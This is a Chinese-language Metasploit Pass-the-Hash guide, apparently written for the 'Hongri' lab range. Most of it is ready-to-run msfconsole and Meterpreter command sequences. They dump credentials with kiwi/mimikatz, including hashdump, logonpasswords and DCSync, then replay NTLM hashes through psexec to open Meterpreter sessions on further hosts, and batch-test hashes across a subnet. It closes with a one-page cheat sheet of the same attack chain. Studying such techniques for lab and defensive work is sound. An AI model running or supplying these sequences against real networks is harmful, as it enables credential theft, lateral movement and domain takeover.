# MSF 下的 PtH 操作

> 配套原理：[哈希传递（Pass-the-Hash）](Pass-the-Hash.md)；落地流程：[操作手册](Pass-the-Hash-操作手册.md)；方法选型：[各方法对比](Pass-the-Hash-各方法对比.md)；纯命令版：[Pass-the-Hash-纯命令版](Pass-the-Hash-纯命令版.md)
> 本篇专讲**全部在 msfconsole 内完成**的 PtH 路线——不依赖 impacket。

---

## 1. 核心机制：`SMBPass` 收哈希

MSF 的 SMB 类模块有个约定：**`SMBPass` 参数既可以填明文密码，也可以填哈希**。

```text
set SMBPass <明文密码>
set SMBPass <LM>:<NT>        ← 标准写法
set SMBPass :<NT>            ← 只有 NT hash 时的简写
```

> **保险起见用完整形式**：`aad3b435b51404eeaad3b435b51404ee:<NTHASH>`
> （前面是空 LM 的固定值）。简写 `:<NT>` 新版本能用，老版本可能不认。

**这就是 MSF 做 PtH 的全部秘密——"密码位置填哈希"。**

---

## 2. MSF 里能做 PtH 的模块

| 模块 | 干什么 | 产出 |
|---|---|---|
| `exploit/windows/smb/psexec` | **主力**，上传 exe + 建服务 | Meterpreter session |
| `exploit/windows/smb/psexec_psh` | PowerShell 版，不落 exe | Meterpreter session |
| `exploit/windows/smb/ms17_010_psexec` | 配合永恒之蓝 | Meterpreter session |
| `auxiliary/admin/smb/psexec_command` | 只执行命令，不建会话 | 命令输出 |
| `auxiliary/scanner/smb/smb_login` | **批量验证哈希** | 哪些机器能通 |
| `exploit/windows/winrm/winrm_script_exec` | 445 不通时走 5985 | Meterpreter session |

查找：

```text
msf6 > search psexec
msf6 > search type:auxiliary smb_login
```

---

## 3. psexec 模块参数详解

```text
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > show options
```

| 参数 | 说明 |
|---|---|
| `RHOSTS` | 目标 IP |
| `SMBUser` | 用户名 |
| `SMBDomain` | 域（**本地账户填 `.`**） |
| `SMBPass` | **密码或哈希** ← 核心 |
| `SMBSHARE` | 默认 `ADMIN$`，不可写时换 `C$` |
| `PAYLOAD` | 默认 `windows/meterpreter/reverse_tcp` |
| `LHOST` / `LPORT` | 回连地址 |

### ⭐ 内网关键点：payload 要改成 bind_tcp

靶场里的内网机器**连不回你的 Kali**，用默认的 `reverse_tcp` 永远上不了线：

```text
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
```

`bind_tcp` 是**目标开端口等你连**，不需要目标能出网——**打内网的标准姿势**。

---

## 4. 完整流程（从已有 session 到下一台）

```text
# ① 现在有 Win7 的 session
meterpreter > getuid
meterpreter > sysinfo

# ② 抓凭据
meterpreter > load kiwi
meterpreter > creds_all
#   输出里找：
#   msv credentials
#   [00000000] Domain   : GOD
#              Username : Administrator
#              NTLM     : 8af326aa4850225b75c592d4ce19ccf5    ← 抄这个

# ③ 退回主控台（不能在 meterpreter 里直接 use 模块）
meterpreter > background

# ④ 用哈希打下一台
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.10.30
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec) > set SMBDomain GOD
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:8af326aa4850225b75c592d4ce19ccf5
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > run

# ⑤ 通了就有新 session
msf6 > sessions -l
msf6 > sessions -i 2
```

**这就是 MSF 打内网的循环：**

```text
session → 抓 hash → background → psexec 打下一台 → 新 session → 回到抓 hash
```

---

## 5. MSF 里拿 hash 的四种方式

```text
# ① Meterpreter 自带（只拿本地账户）
meterpreter > hashdump

# ② kiwi（推荐，能拿明文和域账户）
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"

# ③ Post 模块
meterpreter > run post/windows/gather/smart_hashdump
meterpreter > run post/windows/gather/credentials/credential_collector

# ④ 直接问域控要（需要域管权限）⭐
meterpreter > kiwi_cmd "lsadump::dcsync /domain:GOD /user:Administrator"
```

> 第 ④ 条是拿域管 hash 的**最快路径**——不用登录到任何目标机器。

---

## 6. 批量验证哈希（MSF 版的 crackmapexec）

很多人不知道 MSF 也能批量验证：

```text
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.0/24
msf6 auxiliary(scanner/smb/smb_login) > set SMBUser Administrator
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTHASH>
msf6 auxiliary(scanner/smb/smb_login) > set SMBDomain GOD
msf6 auxiliary(scanner/smb/smb_login) > run
```

输出里出现 `Success: ...` 的就是能用这组哈希打通的机器。

> 但**这个活 nxc 干得更好**（输出更清晰、有 `Pwn3d!` 标记）。MSF 这个模块只在你不想离开 msfconsole 时用。

---

## 7. Kiwi 命令对照

Kiwi = Meterpreter 里的 mimikatz 插件，**不用上传 exe**。

| kiwi 写法 | 等价 mimikatz 命令 | 作用 |
|---|---|---|
| `creds_all` | `sekurlsa::logonpasswords` | 抓所有凭据 |
| `creds_msv` | `sekurlsa::msv` | 只抓 NTLM hash |
| `creds_wdigest` | `sekurlsa::wdigest` | 明文（目标没禁用才有） |
| `creds_kerberos` | `sekurlsa::kerberos` | Kerberos 凭据 |
| `lsa_dump_sam` | `lsadump::sam` | 本地 SAM |
| `lsa_dump_secrets` | `lsadump::secrets` | LSA Secrets |
| `kerberos_ticket_list` | `kerberos::list` | 列票据 |
| **`kiwi_cmd "任意"`** | ← **万能入口** | 跑任何 mimikatz 命令 |

```text
meterpreter > load kiwi
meterpreter > help kiwi            # 看全部可用命令
meterpreter > kiwi_cmd "sekurlsa::logonpasswords"
```

### ⚠️ 关于 kiwi 做 PtH

```text
meterpreter > kiwi_cmd "sekurlsa::pth /user:Administrator /domain:GOD /ntlm:<HASH> /run:cmd.exe"
```

**它只影响新弹出的那个进程**：

- 当前 Meterpreter 会话不受影响
- 那个新 cmd 你也**控制不到**（它是独立窗口）

所以实战里**很少用 kiwi 的 pth 做横向**，而是用**第 4 节那套 MSF 模块**——因为模块能直接给你一个 Meterpreter session。

---

## 8. MSF vs Impacket（在 Kali 上怎么选）

| | MSF | Impacket |
|---|---|---|
| 启动成本 | 要开 msfconsole，慢 | 命令直接敲，快 |
| 拿到什么 | **Meterpreter session**（成套后渗透） | shell / 单条命令输出 |
| 批量探测 | `smb_login` 模块 | `nxc` 更好用 |
| 内网打点 | `autoroute` 建路由后直接打 | 要配 proxychains |
| 隐蔽性 | psexec 较吵 | wmiexec 更静 |

**实战组合：**

```
nxc 探路验证  →  impacket 快速试  →  MSF psexec 拿 session 做后续
```

**什么时候必须上 MSF**：你要打多层内网、需要 `autoroute` + `socks_proxy` 把内网"变成"可访问网段时。impacket 一个个配 proxychains 会累死。

---

## 9. MSF 下常见失败

| 现象 | 原因 | 解法 |
|---|---|---|
| 卡在 "Sending stage" 后无 session | 目标回连不到你 | **换 `bind_tcp`** |
| `Exploit completed, but no session` | 同上，或 payload 位数不对 | 换 bind_tcp / 换 x64 payload |
| 认证失败 | `SMBDomain` 写法错 | 红日填 `GOD`，不是 `god.org` |
| `SMBPass` 不认 | 格式问题 | 用完整 `LM:NT` 形式 |
| 服务创建失败 | 无 ADMIN$ 权限 / 被杀软拦 | 换 `psexec_psh` |
| 打第二台时 session 秒断 | 目标不稳定 / 权限不足 | 先提权再横向 |

---

## 10. 一页速查

```text
# 抓 hash
meterpreter > load kiwi
meterpreter > creds_all
meterpreter > kiwi_cmd "lsadump::dcsync /domain:<域> /user:Administrator"

# 打下一台
meterpreter > background
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS <IP>
msf6 exploit(windows/smb/psexec) > set SMBUser <用户>
msf6 exploit(windows/smb/psexec) > set SMBDomain <域>
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:<HASH>
msf6 exploit(windows/smb/psexec) > set PAYLOAD windows/meterpreter/bind_tcp
msf6 exploit(windows/smb/psexec) > run

# 批量验证
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS <网段>
msf6 auxiliary(scanner/smb/smb_login) > set SMBPass aad3b435b51404eeaad3b435b51404ee:<HASH>
msf6 auxiliary(scanner/smb/smb_login) > run

# 会话管理
msf6 > sessions -l
msf6 > sessions -i <id>
```

**三个最容易忘的点：**
1. **`bind_tcp`** —— 内网机器不出网时必须改
2. **`SMBDomain` 填 `GOD`** —— 红日靶场的经典坑
3. **`background`** —— 不能在 `meterpreter >` 里直接 `use` 模块
